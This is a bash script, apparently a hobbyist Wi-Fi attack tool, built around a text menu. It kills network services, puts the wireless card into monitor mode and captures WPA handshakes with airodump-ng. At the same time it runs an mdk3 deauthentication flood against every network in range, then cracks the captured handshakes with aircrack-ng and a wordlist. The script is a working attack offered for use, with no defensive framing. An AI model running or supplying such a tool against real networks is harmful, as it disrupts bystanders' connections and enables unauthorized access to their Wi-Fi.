#!/bin/bash
lgreen="\e[92m"
lred="\e[91m"
nc="\e[39m"
lyellow="\e[1;33m"

echo "Setting up"

interface=$(netstat -r | grep "default" | awk {'print $8'})
routerip=$(route -n | grep 'UG[ \t]' | awk '{print $2}')
localip=$(hostname -I | awk '{print $1}')
mon="mon"
interfacemon="$interface$mon"
networkname=$(iwgetid -r)
mygithub="https://github.com/rustywolf021"
userpath="$USER"
loop=0

function exitscript()
{
	echo ""
	echo "Turning off monitor mode"
	airmon-ng stop $interfacemon
	echo "Restarting network"
	service NetworkManager restart
	echo "Done"
	echo "Cya :)"
}

echo "Done :)"

function scanneranddeauth()
{
	echo "Setting interface into monitor mode"
	echo "Using interface $interface"
	
	trap exitscript EXIT
	
	airmon-ng check kill
	airmon-ng start $interface
	
	echo "Interface UP"
	
	echo "Starting Capture..."
	
	handshakefile=handshakes/
	if test -d "$handshakefile"; then
		echo "Do you want to over write your old handshakes?"
		echo "Move them somewhere else if you dont want to$"
		read -p "y / n (): " yesorno
		if [[ $yesorno == "y" ]]; then
			echo "Deleting old files"
			rm -r handshakes
			echo "Making file"
			mkdir handshakes
		fi
		if [[ $yesorno == "n" ]]; then
			exit
		fi
		echo "Saving cap files in handshakes/"
	else
		echo "Making file"
		mkdir handshakes
	fi
	
	echo "Starting listener..."
	xterm -e /bin/bash -l -c "airodump-ng $interfacemon -w handshakes/handshakes" &
	sleep 5
	echo "Starting deauth..."
	echo "Press ctrl + c to stop and exit script"
	mdk3 $interfacemon d
}

function wpacracker()
{
	wordlist="None selected (to select one press 2)"
	capfilepath="handshakes/handshakes-01.cap"
	while :
	do
		clear
		echo "Welcome $userpath"
		echo ""
		echo "Wordlist: $wordlist"
		echo "Cap file: $capfilepath"
		echo ""
		echo ""
		echo "1) Start Crack"
		echo ""
		echo "2) Change wordlist"
		echo ""
		echo "b) Back"
		read -p "-->> " menu2
		if [[ $menu2 == "1" ]]; then
			aircrack-ng $capfilepath -w $wordlist
			sleep 1000
			read "Press any key to continue.."
		fi
		if [[ $menu2 == "2" ]]; then
			read -p "Enter wordlist path: " wordlist
		fi
		if [[ $menu2 == "b" ]]; then
			break
		fi
	done
}

while :
do
	clear
	echo "Welcome $userpath"
	echo ""
	echo "Interface: $interface"
	echo "Monitor mode: $interfacemon"
	echo "My networkname: $networkname"
	echo "My ip: $localip"
	echo "Router ip: $routerip"
	echo ""
	echo ""
	echo "1) Start"
	echo ""
	echo "2) Cracker"
	echo ""
	echo "3) Settings"
	echo ""
	echo "e) Exit"
	read -p "-->> " menu1
	if [[ $menu1 == "1" ]]; then
		scanneranddeauth
	fi
	if [[ $menu1 == "2" ]]; then
		wpacracker
	fi
	if [[ $menu1 == "3" ]]; then
		echo "comming soon..."
		sleep 2
	fi
	if [[ $menu1 == "e" ]]; then
		exit
	fi
	echo "Wrong input!"
	sleep 1
done
